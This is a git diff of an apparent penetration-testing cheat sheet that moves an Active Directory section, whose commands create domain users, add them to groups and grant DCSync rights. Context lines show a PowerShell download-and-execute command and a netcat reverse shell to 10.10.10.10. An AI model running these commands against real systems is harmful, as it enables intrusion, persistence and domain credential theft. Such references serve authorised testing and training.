@@ -660,6 +660,25 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Inv
 nc 10.10.10.10 1337 -e /bin/bash
 ```
 
+## Active Directory
+
+Create user in domain :  
+```
+net user $USER $PASS /add /domain
+```
+
+Add user in domain group :  
+```
+net group "$GROUP" /add $USER
+```
+
+Add right on domain user :  
+```
+Add-ObjectACL -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName $USER -Rights $PRIV
+```
+Example :  
+`Add-ObjectACL -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName banana -Rights DCSync`  
+
 ## Misc
 
 ### Common tools
@@ -764,22 +783,3 @@ And then copy `id_rsa.pub` in `/home/$USER/.ssh/authorized_keys` of remote host.
 ```
 ssh $USER@$REMOTE_HOST
 ```
-
-## Active Directory
-
-Create user in domain :  
-```
-net user $USER $PASS /add /domain
-```
-
-Add user in domain group :  
-```
-net group "$GROUP" /add $USER
-```
-
-Add right on domain user :  
-```
-Add-ObjectACL -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName $USER -Rights $PRIV
-```
-Example :  
-`Add-ObjectACL -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName banana -Rights DCSync`  
